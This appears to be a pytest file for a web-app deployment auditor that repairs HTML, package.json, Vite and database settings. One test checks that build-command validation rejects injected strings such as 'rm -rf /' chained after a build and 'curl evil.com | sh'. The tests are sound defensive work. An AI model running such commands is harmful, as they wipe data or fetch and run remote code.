import sys
from pathlib import Path

# Add backend directory to sys.path
backend_root = Path(__file__).resolve().parent.parent
if str(backend_root) not in sys.path:
    sys.path.insert(0, str(backend_root))

import json
import tempfile
from app.services.deployment_readiness_auditor import deployment_readiness_auditor


def test_deployment_auditor_frontend_heal():
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        # Create un-audited HTML without viewport and with '#' href
        (td / "index.html").write_text("<html><head></head><body><a href=\"#\">Home</a></body></html>", encoding="utf-8")
        # Create minimal package.json
        (td / "package.json").write_text(json.dumps({"name": "test-app", "dependencies": {}}), encoding="utf-8")
        # Create React component importing popular npm packages
        (td / "App.jsx").write_text(
            'import { ChevronRight } from "lucide-react";\nimport { motion } from "framer-motion";\nexport default function App() { return <div>Test</div>; }',
            encoding="utf-8"
        )
        # Create vite config without base
        (td / "vite.config.js").write_text("import { defineConfig } from 'vite';\nexport default defineConfig({});", encoding="utf-8")

        # Run auditor
        res = deployment_readiness_auditor.audit_and_heal_source(td)

        assert res["is_production_ready"] is True
        
        # Verify HTML was healed
        html_content = (td / "index.html").read_text(encoding="utf-8")
        assert '<meta name="viewport"' in html_content
        assert '<!DOCTYPE html>' in html_content
        assert 'href="javascript:void(0)"' in html_content

        # Verify package.json was healed
        pkg_data = json.loads((td / "package.json").read_text(encoding="utf-8"))
        assert "lucide-react" in pkg_data["dependencies"]
        assert "framer-motion" in pkg_data["dependencies"]
        assert "build" in pkg_data["scripts"]

        # Verify vite config has relative base
        vite_content = (td / "vite.config.js").read_text(encoding="utf-8")
        assert "base: './'" in vite_content


def test_deployment_auditor_backend_db_heal():
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        # Create a backend file with SQLite and ujson
        backend_dir = td / "backend"
        backend_dir.mkdir(parents=True)
        (backend_dir / "database.py").write_text(
            'from sqlalchemy.ext.asyncio import create_async_engine\nDATABASE_URL = "sqlite+aiosqlite:///./test.db"\nengine = create_async_engine(DATABASE_URL)',
            encoding="utf-8"
        )
        (backend_dir / "requirements.txt").write_text(
            'aiosqlite\nujson\nfastapi\n',
            encoding="utf-8"
        )

        res = deployment_readiness_auditor.audit_and_heal_source(td)
        assert res["is_production_ready"] is True

        req_content = (backend_dir / "requirements.txt").read_text(encoding="utf-8")
        assert "aiosqlite" not in req_content
        assert "ujson" not in req_content
        assert "asyncpg" in req_content

        db_content = (backend_dir / "database.py").read_text(encoding="utf-8")
        assert 'os.environ["DATABASE_URL"]' in db_content


def test_build_failure_self_healing():
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "package.json").write_text(json.dumps({"dependencies": {}}), encoding="utf-8")
        
        mock_build_logs = """
        [vite] Internal server error: Failed to resolve import "clsx" from "src/utils.js". Does the file exist?
        Error: Cannot find module 'tailwind-merge'
        """

        heal_res = deployment_readiness_auditor.diagnose_and_heal_build_failure(td, mock_build_logs)
        assert heal_res["healed"] is True
        
        pkg_data = json.loads((td / "package.json").read_text(encoding="utf-8"))
        assert "clsx" in pkg_data["dependencies"]
        assert "tailwind-merge" in pkg_data["dependencies"]


def test_deployment_build_command_sanitization():
    """F-11 & F-02: DeploymentBase must reject shell injections and untrusted build commands."""
    import pytest
    from pydantic import ValidationError
    from app.schemas.deployment import DeploymentBase

    # 1. Valid commands pass
    d1 = DeploymentBase(project_name="my-app", build_command="npm run build")
    assert d1.build_command == "npm run build"

    d2 = DeploymentBase(project_name="my-app", build_command="pnpm build")
    assert d2.build_command == "pnpm build"

    # Static / no-build keywords pass cleanly
    d3 = DeploymentBase(project_name="my-app", build_command="none")
    assert d3.build_command == "none"

    d4 = DeploymentBase(project_name="my-app", build_command="static")
    assert d4.build_command == "static"

    # 2. Command chaining / semicolons fail
    with pytest.raises(ValidationError):
        DeploymentBase(project_name="my-app", build_command="npm run build; rm -rf /")

    with pytest.raises(ValidationError):
        DeploymentBase(project_name="my-app", build_command="npm run build && curl evil.com | sh")

    # 3. Disallowed binary / shell invocation fails
    with pytest.raises(ValidationError):
        DeploymentBase(project_name="my-app", build_command="bash malicious.sh")


def test_deployment_auditor_heal_pre_build_callable():
    """Verify heal_pre_build accepts string path and returns (bool, list)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "index.html").write_text("<html><head></head><body><p>Hello</p></body></html>", encoding="utf-8")
        
        # Test string path input
        healed, findings = deployment_readiness_auditor.heal_pre_build(str(td))
        assert isinstance(healed, bool)
        assert isinstance(findings, list)
        assert healed is True
        assert any("<!DOCTYPE html>" in f for f in findings)


if __name__ == "__main__":
    test_deployment_auditor_frontend_heal()
    print("test_deployment_auditor_frontend_heal: PASSED")
    test_deployment_auditor_backend_db_heal()
    print("test_deployment_auditor_backend_db_heal: PASSED")
    test_build_failure_self_healing()
    print("test_build_failure_self_healing: PASSED")
    print("ALL TESTS PASSED 100%!")
